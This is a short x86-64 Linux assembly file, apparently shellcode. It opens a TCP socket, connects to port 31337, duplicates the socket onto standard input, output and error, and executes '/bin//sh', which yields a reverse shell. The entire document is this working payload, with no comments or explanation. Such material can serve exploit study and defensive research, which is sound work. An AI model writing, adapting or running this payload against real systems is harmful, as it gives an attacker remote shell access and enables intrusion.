
	.section .text
	.globl _start

_start:

	movb	$0x29,%al
	pushq	$2
	popq	%rdi
	pushq	$1
	popq	%rsi
	xorl	%edx,%edx
	syscall

	pushq	%rax
	popq	%rbx

	pushq	$0
	pushq	$0x697a0002

	pushq	$0x2a
	movl	%ebx,%edi
	popq	%rax
	movq	%rsp,%rsi
	pushq	$0x10
	popq	%rdx
	syscall

	pushq	$2
	popq	%rbp
.L0:
	pushq	$0x21
	popq	%rax
	movl	%ebx,%edi
	movl	%ebp,%esi
	syscall
	decl	%ebp
	jns	.L0

	xorl	%eax,%eax
	pushq	%rax
	movq	$0x68732f2f6e69622f,%rdx
	pushq	%rdx
	movq	%rsp,%rdi
	pushq	%rax
	movq	%rsp,%rdx
	pushq	%rdi
	movq	%rsp,%rsi
	movb	$0x3b,%al
	syscall

